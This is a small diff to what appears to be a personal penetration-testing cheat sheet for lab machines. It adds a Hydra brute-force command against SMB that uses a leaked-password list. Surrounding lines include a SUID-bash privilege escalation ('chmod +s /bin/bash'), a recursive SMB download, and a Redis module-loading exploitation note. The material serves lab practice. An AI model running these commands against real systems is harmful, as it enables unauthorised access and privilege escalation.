@@ -123,6 +123,10 @@ chmod +s /bin/bash
 	
 #### smbget download a directory recursively
 > 1. smbget -Rv smb://10.11.1.31/wwwroot
+
+#### smb bruteforce via Hydra
+> 1. hydra smb://192.168.10.18 -L /var/tmp/004_vulnhub/mercyv2/users -e nsr -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -V -
+F
 	
 #### Exploiting Redis service --- Usually running on 6379
 > 1. "Redis Load Module" technique, for this you need to upload a file to SERVER, so something like FTP or SSH with WRITE access
